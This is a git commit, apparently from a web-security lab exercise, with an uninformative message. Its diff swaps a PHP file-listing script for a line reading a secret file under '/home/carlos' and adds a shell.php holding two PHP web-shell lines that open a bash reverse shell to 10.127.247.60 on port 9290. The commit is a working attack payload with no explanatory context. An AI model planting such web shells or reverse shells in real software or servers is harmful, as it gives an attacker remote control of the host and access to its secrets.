7765fc48df599cf474a9101f0be19e2c084d46e8
public_hysteria <juuzodes@yandex.ru>
2024-10-15 18:58:04 +0300

    ff

--- dir.php
+++ dir.php
@@ -1,6 +1,1 @@
-var files = <?php $out = array();
-foreach (glob('file/*.html') as $filename) {
-    $p = pathinfo($filename);
-    $out[] = $p['filename'];
-}
-echo json_encode($out); ?>;
+<?php file_get_contents('/home/carlos/secret');?>
---
+++ shell.php
@@ -0,0 +1,2 @@
+<?php system("/bin/bash -c 'bash -i >& /dev/tcp/10.127.247.60/9290 0>&1")?>
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.127.247.60/9290 0>&1")?>
